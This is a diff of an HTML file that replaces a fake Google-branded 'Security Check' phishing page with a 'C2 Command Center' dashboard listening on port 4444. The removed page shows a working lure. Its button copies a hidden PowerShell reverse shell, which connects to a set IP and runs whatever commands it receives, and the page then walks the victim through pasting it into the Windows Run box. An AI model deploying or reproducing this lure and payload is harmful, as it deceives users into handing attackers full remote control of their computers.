@@ -1,41 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Security Check</title>
+    <title>C2 Command Center</title>
     <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; margin-top: 100px; background: #f9f9f9; }
-        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 350px; }
-        button { background: #4285f4; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; font-weight: bold; }
-        .instructions { display: none; background: #fff3cd; padding: 15px; margin-top: 15px; border: 1px solid #ffeeba; text-align: left; font-size: 14px; }
+        body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
+        .dashboard { border: 2px solid #00ff41; padding: 20px; background: #000; max-width: 800px; margin: auto; }
+        .header { border-bottom: 1px solid #00ff41; padding-bottom: 10px; margin-bottom: 20px; }
+        .log-window { background: #050505; border: 1px solid #333; height: 300px; overflow-y: scroll; padding: 10px; font-size: 13px; }
+        .status-on { color: #00ff41; font-weight: bold; }
+        .cmd-hint { color: #888; margin-top: 10px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-        <h3>Verify your Identity</h3>
-        <p id="msg">Click below to fix a browser connection error.</p>
-        <button id="btn" onclick="copyAndTrap()">Fix Connection</button>
+    <div class="dashboard">
+        <div class="header">
+            <h2>EXTERNAL ASSET MONITOR [v1.0]</h2>
+            <p>LISTENING ON: <span class="status-on">0.0.0.0:4444</span></p>
+        </div>
 
-        <div id="steps" class="instructions">
-            <strong>Manual Fix Required:</strong><br>
-            1. Press <b>Win + R</b> on your keyboard.<br>
-            2. <b>Right-Click</b> in the box and <b>Paste</b>.<br>
-            3. Press <b>Enter</b> to verify.
+        <div class="log-window" id="console">
+            [SYSTEM] Starting listener...<br>
+            [SYSTEM] Awaiting beacon from 192.168.40.136...<br>
+        </div>
+
+        <div class="cmd-hint">
+            <p><strong>Note:</strong> Use the Python terminal (server.py) to send real-time commands once the connection is established.</p>
         </div>
     </div>
 
     <script>
-        function copyAndTrap() {
-            // REPLACE 'YOUR_IP_HERE' with your main computer's internal IP address
-            const ip = "192.168.40.136"; 
-            const cmd = `powershell -WindowStyle Hidden -Command "$c = New-Object System.Net.Sockets.TCPClient('${ip}',4444);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2  = $sb + 'PS ' + (pwd).Path + '> ';$sendb = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendb,0,$sendb.Length);$s.Flush()};$c.Close()"`;
-
-            navigator.clipboard.writeText(cmd).then(() => {
-                document.getElementById('btn').style.display = 'none';
-                document.getElementById('msg').innerText = "Follow the steps to complete verification:";
-                document.getElementById('steps').style.display = 'block';
-            });
-        }
+        // Visual simulation for the dashboard UI
+        const consoleLog = document.getElementById('console');
+        setInterval(() => {
+            const time = new Date().toLocaleTimeString();
+            consoleLog.innerHTML += `<span style="color:#555">[${time}] Listener heartbeat... ok</span><br>`;
+            consoleLog.scrollTop = consoleLog.scrollHeight;
+        }, 5000);
     </script>
 </body>
 </html>
